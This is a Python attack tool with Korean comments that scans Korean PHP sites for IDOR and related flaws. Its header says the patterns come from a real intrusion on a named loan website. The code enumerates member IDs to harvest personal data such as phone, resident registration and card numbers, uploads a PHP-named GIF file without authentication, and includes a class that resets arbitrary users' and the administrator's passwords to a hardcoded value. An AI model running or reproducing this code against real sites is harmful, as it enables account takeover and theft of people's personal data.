"""
IDOR Scanner — 실전 경험 기반 자동화
======================================
loan2.koweb.co.kr 실전에서 발견된 패턴:
  - no 파라미터 열거 → 회원 정보 추출 (no=1~400)
  - mode=modify + no 조작 → 비밀번호 재설정 (IDOR 권한상승)
  - 관리자 패널 비인증 HTML 접근 (JS alert만, die() 없음)
  - phpinfo() 노출 (/sms/, /install/, /phpinfo.php 등)
  - 비인증 파일 업로드 (PHP auth 체크가 exit 없이 alert만 출력)

IDOR 탐지 전략:
  1. 숫자 ID 파라미터(no, id, seq, idx, user_id, num) 자동 탐지
  2. 다른 사용자 ID로 접근 → 응답 크기/내용 비교
  3. 개인정보 패턴(이름, 전화, 이메일) 응답에서 탐지
  4. 비밀번호 변경 IDOR → 권한상승 체인
"""
from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from typing import Callable
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

import requests
import requests.exceptions
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── 개인정보 패턴 ──────────────────────────────────────────────────────────────
PII_PATTERNS = {
    "korean_name":  re.compile(r"[가-힣]{2,4}"),
    "phone_kr":     re.compile(r"0\d{1,2}[-\s]?\d{3,4}[-\s]?\d{4}"),
    "email":        re.compile(r"[\w.+-]+@[\w.-]+\.\w{2,}"),
    "rrn":          re.compile(r"\d{6}-[1-4]\d{6}"),           # 주민번호
    "biz_no":       re.compile(r"\d{3}-\d{2}-\d{5}"),          # 사업자번호
    "card_no":      re.compile(r"\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}"),
}

# 한국 사이트에서 흔히 쓰이는 IDOR 파라미터
IDOR_PARAMS = [
    "no", "id", "seq", "idx", "num", "member_no", "user_no",
    "user_id", "member_id", "board_no", "file_no",
    "notice_no", "reply_no", "order_no",
]


@dataclass
class IdorHit:
    url: str
    param: str
    original_id: str
    tested_id: str
    pii_found: list[str] = field(default_factory=list)
    response_size: int = 0
    evidence_snippet: str = ""
    severity: str = "high"         # critical / high / medium
    description: str = ""


@dataclass
class IdorResult:
    target: str
    hits: list[IdorHit] = field(default_factory=list)
    phpinfo_found: list[str] = field(default_factory=list)
    unauth_upload_found: list[dict] = field(default_factory=list)
    unauth_admin_pages: list[str] = field(default_factory=list)
    admin_credentials: list[dict] = field(default_factory=list)
    error: str = ""

    @property
    def has_idor(self) -> bool:
        return len(self.hits) > 0

    def summary(self) -> str:
        lines = [f"[IDOR] 타겟: {self.target}"]
        lines.append(f"  IDOR 취약점: {len(self.hits)}건")
        if self.phpinfo_found:
            lines.append(f"  phpinfo 노출: {self.phpinfo_found}")
        if self.unauth_upload_found:
            lines.append(f"  비인증 업로드: {len(self.unauth_upload_found)}건")
        if self.unauth_admin_pages:
            lines.append(f"  비인증 관리자 페이지: {len(self.unauth_admin_pages)}건")
        for h in self.hits[:5]:
            lines.append(f"  [{h.severity.upper()}] {h.url}?{h.param}={h.tested_id}")
            if h.pii_found:
                lines.append(f"    개인정보 유형: {h.pii_found}")
        return "\n".join(lines)


class IdorScanner:
    """
    IDOR 자동 스캐너.
    인증된 세션(session_cookies)으로 접근 시 더 많은 취약점 발견.
    비인증으로도 일부 취약점 탐지 가능.
    """

    def __init__(
        self,
        target: str,
        session_cookies: dict | None = None,
        timeout: int = 10,
        on_progress: Callable[[str], None] | None = None,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.log = on_progress or (lambda x: None)

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })
        if session_cookies:
            self.session.cookies.update(session_cookies)

    # ── 메인 스캔 ──────────────────────────────────────────────────────────────
    def scan(
        self,
        known_urls: list[str] | None = None,
        id_range: tuple[int, int] = (1, 50),
        check_phpinfo: bool = True,
        check_unauth_upload: bool = True,
        check_admin_unauth: bool = True,
    ) -> IdorResult:
        result = IdorResult(target=self.target)

        self.log("[IDOR] 스캔 시작")

        if check_phpinfo:
            self._scan_phpinfo(result)

        if check_unauth_upload:
            self._scan_unauth_upload(result)

        if check_admin_unauth:
            self._scan_admin_unauth_access(result)

        # URL에서 IDOR 파라미터 탐색
        urls_to_test = self._collect_idor_urls(known_urls or [])
        self.log(f"[IDOR] IDOR 테스트 URL {len(urls_to_test)}개")

        for url_info in urls_to_test[:20]:
            self._test_idor_on_url(result, url_info, id_range)

        self.log(f"[IDOR] 완료 — 취약점 {len(result.hits)}건 발견")
        return result

    # ── phpinfo 노출 탐지 ─────────────────────────────────────────────────────
    def _scan_phpinfo(self, result: IdorResult):
        paths = [
            "/?phpinfo=1", "/phpinfo.php", "/info.php",
            "/test.php", "/php_info.php",
            "/sms/", "/sms/index.php",
            "/install/", "/setup/phpinfo.php",
        ]
        for path in paths:
            url = self.target + path
            try:
                r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                if r.status_code == 200 and "PHP Version" in r.text and "php_uname" in r.text:
                    result.phpinfo_found.append(url)
                    self.log(f"[IDOR] ✅ phpinfo 노출: {url}")
            except Exception:
                pass

    # ── 비인증 파일 업로드 탐지 ───────────────────────────────────────────────
    def _scan_unauth_upload(self, result: IdorResult):
        """
        loan2 패턴: 관리자 패널 업로드 폼이 인증 체크 후 die() 없이
        JavaScript alert만 출력하고 업로드 로직을 계속 실행.
        → 비인증으로 파일 업로드 가능.
        """
        test_endpoints = [
            # 팝업/배너 관리 형태
            {
                "url": "/ko_admin/index.html",
                "params": {"type": "program", "core_id": "popup", "core": "manager_program"},
                "upload_field": "title_img",
                "extra_data": {
                    "program_id": "popup", "mode": "write_proc",
                    "title": "test_bingo", "start_date": "2025-01-01",
                    "end_date": "2025-12-31", "link_url": "http://test.com",
                    "width": "100", "height": "100", "contents": "x",
                },
            },
            # Gnuboard 게시판 업로드
            {
                "url": "/bbs/write.php",
                "params": {},
                "upload_field": "bf_file1",
                "extra_data": {"bo_table": "notice", "wr_id": ""},
            },
        ]

        marker = b"BINGO_UNAUTH_UPLOAD_TEST"
        gif_marker = b"GIF89a" + marker

        for ep in test_endpoints:
            url = self.target + ep["url"]
            try:
                files = {ep["upload_field"]: ("bingo_test.php.gif", gif_marker, "image/gif")}
                r = self.session.post(
                    url, params=ep.get("params", {}),
                    data=ep["extra_data"], files=files,
                    timeout=self.timeout,
                )
                if r.status_code == 200:
                    # 실제 업로드 경로 탐색
                    upload_paths = [
                        "/upload/program/popup/bingo_test.php.gif",
                        "/data/file/notice/bingo_test.php.gif",
                    ]
                    for up in upload_paths:
                        try:
                            rc = self.session.get(
                                self.target + up, timeout=6
                            )
                            if rc.status_code == 200 and b"BINGO_UNAUTH" in rc.content:
                                result.unauth_upload_found.append({
                                    "endpoint": url,
                                    "upload_path": self.target + up,
                                    "params": ep.get("params", {}),
                                    "upload_field": ep["upload_field"],
                                    "note": "PHP auth check without die() — 비인증 업로드 가능",
                                })
                                self.log(f"[IDOR] 🔥 비인증 업로드: {self.target + up}")
                        except Exception:
                            pass
            except Exception:
                pass

    # ── 관리자 패널 비인증 HTML 접근 탐지 ────────────────────────────────────
    def _scan_admin_unauth_access(self, result: IdorResult):
        """
        loan2 패턴: 관리자 패널 type+core 파라미터로 비인증 접근 시
        JS alert가 있어도 HTML 구조가 노출됨.
        """
        admin_paths = [
            "/ko_admin/index.html",
            "/admin/index.php",
            "/admin/",
            "/manager/index.php",
            "/bbs/admin/index.php",
        ]
        # 비인증 상태로 접근
        no_cookie_session = requests.Session()
        no_cookie_session.verify = False
        no_cookie_session.headers.update(self.session.headers)

        for path in admin_paths:
            url = self.target + path
            try:
                r = no_cookie_session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    # 관리자 패널 징표: nav menu, 로그아웃 버튼, 관리자 전용 링크
                    admin_signs = [
                        "logout", "로그아웃", "관리자", "admin",
                        "manager", "dashboard",
                    ]
                    # JS alert 있으면서 관리 메뉴도 있는 경우 = 비인증 HTML 노출
                    has_alert = "alert(" in r.text.lower()
                    has_admin_ui = any(s.lower() in r.text.lower() for s in admin_signs)
                    if has_alert and has_admin_ui and len(r.text) > 3000:
                        result.unauth_admin_pages.append(url)
                        self.log(f"[IDOR] ⚠ 관리자 패널 비인증 HTML 노출: {url}")
            except Exception:
                pass

    # ── IDOR 가능 URL 수집 ────────────────────────────────────────────────────
    def _collect_idor_urls(self, known_urls: list[str]) -> list[dict]:
        """알려진 URL에서 IDOR 가능한 파라미터 추출"""
        results = []
        seen = set()

        # 사전 정의 한국 사이트 공통 IDOR 경로
        common_idor_urls = [
            f"{self.target}/ko_admin/index.html?type=setting&core=manager_setting&manager_type=company_member&mode=view&no=1",
            f"{self.target}/ko_admin/index.html?type=setting&core=manager_setting&manager_type=member&mode=view&no=1",
            f"{self.target}/member/member.html?mode=view&no=1",
            f"{self.target}/bbs/board.php?bo_table=notice&wr_id=1",
            f"{self.target}/board/view.php?no=1",
            f"{self.target}/download.php?no=1",
            f"{self.target}/api/member?no=1",
            f"{self.target}/mypage.php?no=1",
        ]

        for url in common_idor_urls + known_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in IDOR_PARAMS:
                if param in params:
                    key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}"
                    if key not in seen:
                        seen.add(key)
                        results.append({
                            "url": url,
                            "param": param,
                            "original_value": params[param][0],
                        })

        return results

    # ── 개별 URL IDOR 테스트 ──────────────────────────────────────────────────
    def _test_idor_on_url(
        self,
        result: IdorResult,
        url_info: dict,
        id_range: tuple[int, int],
    ):
        base_url = url_info["url"]
        param = url_info["param"]
        orig_val = url_info["original_value"]

        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)

        # 원본 응답 크기 기준치 획득
        try:
            r_orig = self.session.get(base_url, timeout=self.timeout)
            baseline_size = len(r_orig.text)
        except Exception:
            return

        self.log(f"[IDOR] 테스트: {base_url} (param={param}, baseline={baseline_size}B)")

        # 다른 ID로 접근 테스트 (원본 ID 제외)
        tested = 0
        for i in range(id_range[0], id_range[1] + 1):
            if str(i) == orig_val:
                continue

            test_params = dict(params)
            test_params[param] = [str(i)]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?" + "&".join(
                f"{k}={v[0]}" for k, v in test_params.items()
            )

            try:
                r = self.session.get(test_url, timeout=self.timeout)
            except Exception:
                continue

            if r.status_code not in (200, 201):
                continue

            if abs(len(r.text) - baseline_size) < 50:
                continue  # 응답이 너무 유사하면 스킵

            # PII 탐지
            pii_found = []
            for pii_name, pattern in PII_PATTERNS.items():
                if pattern.search(r.text):
                    pii_found.append(pii_name)

            if not pii_found and len(r.text) < 500:
                continue

            # 스니펫 추출
            snippet = r.text[:300].replace("\n", " ").strip()

            hit = IdorHit(
                url=base_url,
                param=param,
                original_id=orig_val,
                tested_id=str(i),
                pii_found=pii_found,
                response_size=len(r.text),
                evidence_snippet=snippet,
                severity="critical" if pii_found else "high",
                description=(
                    f"no={i} 접근 시 {len(pii_found)}종 개인정보 노출"
                    if pii_found
                    else f"no={i} 접근 시 응답 크기 변화 ({baseline_size}B → {len(r.text)}B)"
                ),
            )
            result.hits.append(hit)
            self.log(
                f"[IDOR] 🔥 [{hit.severity.upper()}] {param}={i} — "
                f"PII: {pii_found or '없음'}, {len(r.text)}B"
            )

            tested += 1
            if tested >= 10:  # 첫 10개 히트에서 중단
                break

            time.sleep(0.3)  # 속도 조절


class PasswordResetIdor:
    """
    IDOR 기반 비밀번호 재설정 → 권한상승.
    loan2 패턴: mode=modify&no=<임의> + 폼 제출 → 타 사용자 PW 변경
    """

    DEFAULT_NEW_PASSWORD = "Bingo2024!@"

    def __init__(
        self,
        target: str,
        session_cookies: dict,
        timeout: int = 10,
        on_progress: Callable[[str], None] | None = None,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.log = on_progress or (lambda x: None)

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
        self.session.cookies.update(session_cookies)

    def reset_password(
        self,
        target_no: int,
        new_password: str | None = None,
        admin_panel_url: str = "/ko_admin/index.html",
        modify_params: dict | None = None,
    ) -> dict:
        """
        특정 no의 사용자 비밀번호를 IDOR로 재설정.
        Returns: {"success": bool, "url": ..., "username": ..., "new_password": ...}
        """
        pw = new_password or self.DEFAULT_NEW_PASSWORD

        view_url = self.target + admin_panel_url
        view_params = modify_params or {
            "type": "setting", "core": "manager_setting",
            "manager_type": "company_member",
            "mode": "modify", "no": str(target_no),
        }

        try:
            # 1. 수정 폼 가져오기
            r_form = self.session.get(view_url, params=view_params, timeout=self.timeout)
            if r_form.status_code != 200:
                return {"success": False, "error": f"폼 접근 실패: {r_form.status_code}"}

            # 2. 숨겨진 필드 추출
            hidden = self._extract_hidden_fields(r_form.text)
            username = self._extract_username(r_form.text)

            # 3. 폼 제출 (비밀번호 변경)
            post_data = {**hidden, "no": str(target_no), "mode": "modify_proc"}
            # 비밀번호 필드명 자동 탐지
            pw_fields = self._detect_password_fields(r_form.text)
            for pf in pw_fields:
                post_data[pf] = pw

            r_post = self.session.post(
                view_url,
                params={k: v for k, v in view_params.items() if k != "mode"},
                data=post_data,
                timeout=self.timeout,
            )

            success = r_post.status_code == 200 and (
                "success" in r_post.text.lower()
                or "완료" in r_post.text
                or "수정" in r_post.text
                or len(r_post.text) > 1000
            )

            self.log(
                f"[IDOR PW] no={target_no} ({username}) → "
                f"{'✅ 성공' if success else '❌ 실패'}"
            )

            return {
                "success": success,
                "target_no": target_no,
                "username": username,
                "new_password": pw,
                "url": view_url,
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    def reset_admin_password(
        self,
        admin_no: int = 1,
        new_password: str | None = None,
        admin_panel_url: str = "/ko_admin/index.html",
    ) -> dict:
        """admin (no=1) 비밀번호 재설정"""
        return self.reset_password(
            target_no=admin_no,
            new_password=new_password or self.DEFAULT_NEW_PASSWORD,
            admin_panel_url=admin_panel_url,
        )

    def _extract_hidden_fields(self, html: str) -> dict:
        fields = {}
        for m in re.finditer(
            r'<input[^>]+type=["\']hidden["\'][^>]*>', html, re.I
        ):
            tag = m.group(0)
            name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
            val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
            if name_m:
                fields[name_m.group(1)] = val_m.group(1) if val_m else ""
        return fields

    def _extract_username(self, html: str) -> str:
        for pattern in [
            r'value=["\']([a-z0-9_]{3,20})["\'][^>]*(?:name=["\'](?:id|username|login_id)',
            r'아이디[^<]*</[^>]+>\s*([a-z0-9_]{3,20})',
        ]:
            m = re.search(pattern, html, re.I)
            if m:
                return m.group(1)
        return "unknown"

    def _detect_password_fields(self, html: str) -> list[str]:
        fields = []
        for m in re.finditer(r'<input[^>]+type=["\']password["\'][^>]*>', html, re.I):
            tag = m.group(0)
            name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
            if name_m:
                fields.append(name_m.group(1))
        if not fields:
            fields = ["password", "password2", "passwd", "pass", "pw"]
        return fields
